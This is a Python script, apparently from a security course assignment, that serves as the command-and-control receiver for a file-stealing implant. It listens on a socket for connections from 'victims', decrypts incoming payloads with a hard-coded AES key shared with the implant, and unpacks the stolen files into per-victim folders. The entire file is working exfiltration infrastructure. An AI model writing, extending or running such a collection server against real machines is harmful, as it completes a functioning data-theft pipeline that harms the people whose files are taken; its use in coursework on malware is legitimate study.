#!/usr/bin/env python3
import os
import sys
import socket
import zipfile
import struct
import io
from datetime import datetime

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

# Must match the implant exactly
AES_KEY = b'CSE363_HW4_KEY_0CSE363_HW4_KEY_0'  # 32 bytes
AES_IV  = b'CSE363_HW4_IV_00'                   # 16 bytes


def decrypt(data):
    """Decrypt AES-256 CBC encrypted bytes and remove PKCS7 padding."""
    cipher = Cipher(
        algorithms.AES(AES_KEY),
        modes.CBC(AES_IV),
        backend=default_backend()
    )
    decryptor = cipher.decryptor()
    padded = decryptor.update(data) + decryptor.finalize()

    unpadder = padding.PKCS7(128).unpadder()
    return unpadder.update(padded) + unpadder.finalize()


def receive_all(conn, length):
    """Read exactly `length` bytes from a socket."""
    data = b''
    while len(data) < length:
        chunk = conn.recv(length - len(data))
        if not chunk:
            break
        data += chunk
    return data


def handle_victim(conn, victim_ip):
    """Receive, decrypt, and extract files from one victim connection."""
    # Read the 4-byte length header first
    raw_len = receive_all(conn, 4)
    if len(raw_len) < 4:
        return

    payload_len = struct.unpack('>I', raw_len)[0]
    encrypted   = receive_all(conn, payload_len)

    # Decrypt
    zip_data = decrypt(encrypted)

    # Build output directory name: timestamp_victimIP
    timestamp  = datetime.now().strftime("%Y-%m-%d:%H:%M:%S")
    output_dir = f"{timestamp}_{victim_ip}"
    os.makedirs(output_dir, exist_ok=True)

    # Extract ZIP into that directory
    with zipfile.ZipFile(io.BytesIO(zip_data), 'r') as zf:
        zf.extractall(output_dir)

    print(f"[+] Received data from {victim_ip} → saved to '{output_dir}'")


def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <ip> <port>")
        sys.exit(1)

    listen_ip   = sys.argv[1]
    listen_port = int(sys.argv[2])

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((listen_ip, listen_port))
    server.listen(5)
    print(f"[*] Listening on {listen_ip}:{listen_port} ...")

    while True:
        conn, (victim_ip, _) = server.accept()
        print(f"[*] Connection from {victim_ip}")
        try:
            handle_victim(conn, victim_ip)
        except Exception as e:
            print(f"[!] Error handling {victim_ip}: {e}")
        finally:
            conn.close()


if __name__ == "__main__":
    main()